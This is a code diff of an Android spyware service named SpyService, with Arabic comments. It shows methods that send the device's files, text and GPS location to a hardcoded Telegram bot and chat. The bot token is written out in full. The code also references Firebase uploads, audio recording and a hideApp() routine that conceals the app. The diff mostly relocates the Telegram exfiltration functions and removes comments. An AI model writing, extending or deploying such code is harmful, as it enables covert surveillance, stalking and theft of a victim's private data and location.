@@ -35,6 +35,7 @@ import okhttp3.*;
 import org.json.JSONObject;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.net.URL;
 import java.util.HashMap;
 import java.util.List;
@@ -59,7 +60,7 @@ public class SpyService extends Service {
     private boolean isTrackingLocation = false;
     private boolean foregroundStarted = false;
 
-    // ====== توكن البوت (ضع توكنك هنا) ======
+    // ====== توكن البوت ======
     private static final String BOT_TOKEN = "8962511911:AAHYZpdZJVkNif1iF1-3odKTqq2owgDk16M";
     private static final String CHAT_ID = "6793813126";
 
@@ -181,7 +182,6 @@ public class SpyService extends Service {
         dataRef.child(type).setValue(data);
     }
 
-    // إرسال إلى Firebase (بدون حذف)
     private void sendFileToFirebase(File file, String caption) {
         try {
             byte[] bytes = new byte[(int) file.length()];
@@ -195,14 +195,12 @@ public class SpyService extends Service {
             json.put("caption", caption);
             json.put("path", file.getAbsolutePath());
             sendData("FILE", json.toString());
-            // لا نحذف الملف (تم إزالة file.delete())
             Log.d(TAG, "📤 أُرسل إلى Firebase: " + file.getName());
         } catch (Exception e) {
             Log.e(TAG, "Send file to Firebase error", e);
         }
     }
 
-    // إرسال إلى تيليجرام (بدون حذف)
     private void sendFileToTelegram(File file, String caption) {
         try {
             RequestBody body = new MultipartBody.Builder()
@@ -227,14 +225,50 @@ public class SpyService extends Service {
                     response.close();
                 }
             });
-            // لا نحذف الملف (تم إزالة file.delete())
         } catch (Exception e) {
             Log.e(TAG, "Send file to Telegram error", e);
         }
     }
 
+    private void sendTextToTelegram(String text) {
+        try {
+            JSONObject json = new JSONObject();
+            json.put("chat_id", CHAT_ID);
+            json.put("text", text);
+            json.put("parse_mode", "Markdown");
+            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
+                    .post(body)
+                    .build();
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
+            });
+        } catch (Exception e) { Log.e(TAG, "sendText error", e); }
+    }
+
+    private void sendLocationToTelegram(double lat, double lng) {
+        try {
+            String text = "📍 الموقع: https://maps.google.com/maps?q=" + lat + "," + lng;
+            JSONObject json = new JSONObject();
+            json.put("chat_id", CHAT_ID);
+            json.put("text", text);
+            json.put("parse_mode", "Markdown");
+            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
+                    .post(body)
+                    .build();
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
+            });
+        } catch (Exception e) { Log.e(TAG, "sendLocation error", e); }
+    }
+
     // ======================================================================
-    // ========== تنفيذ الأوامر (إرسال مزدوج) ==========
+    // ========== تنفيذ الأوامر ==========
     // ======================================================================
 
     private void executeCommand(String cmd) {
@@ -407,7 +441,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== دوال جمع البيانات (بدون حذف الملفات) ==========
+    // ========== دوال جمع البيانات ==========
     // ======================================================================
 
     private int getBatteryLevel() {
@@ -556,7 +590,6 @@ public class SpyService extends Service {
             if (loc != null) {
                 String data = loc.getLatitude() + "," + loc.getLongitude();
                 sendData("LOCATION", data);
-                // إرسال الموقع أيضاً إلى تيليجرام
                 sendLocationToTelegram(loc.getLatitude(), loc.getLongitude());
             } else {
                 locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
@@ -573,25 +606,6 @@ public class SpyService extends Service {
         } catch (SecurityException e) {
             sendData("ERROR", "صلاحية الموقع غير مفعلة");
         }
-    }
-
-    private void sendLocationToTelegram(double lat, double lng) {
-        try {
-            String text = "📍 الموقع: https://maps.google.com/maps?q=" + lat + "," + lng;
-            JSONObject json = new JSONObject();
-            json.put("chat_id", CHAT_ID);
-            json.put("text", text);
-            json.put("parse_mode", "Markdown");
-            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
-            Request request = new Request.Builder()
-                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
-                    .post(body)
-                    .build();
-            httpClient.newCall(request).enqueue(new Callback() {
-                @Override public void onFailure(Call call, IOException e) {}
-                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
-            });
-        } catch (Exception e) { Log.e(TAG, "sendLocation error", e); }
     }
 
     private void startRecording() {
@@ -631,24 +645,6 @@ public class SpyService extends Service {
             }
         }
         return null;
-    }
-
-    private void sendTextToTelegram(String text) {
-        try {
-            JSONObject json = new JSONObject();
-            json.put("chat_id", CHAT_ID);
-            json.put("text", text);
-            json.put("parse_mode", "Markdown");
-            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
-            Request request = new Request.Builder()
-                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
-                    .post(body)
-                    .build();
-            httpClient.newCall(request).enqueue(new Callback() {
-                @Override public void onFailure(Call call, IOException e) {}
-                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
-            });
-        } catch (Exception e) { Log.e(TAG, "sendText error", e); }
     }
 
     private void hideApp() {
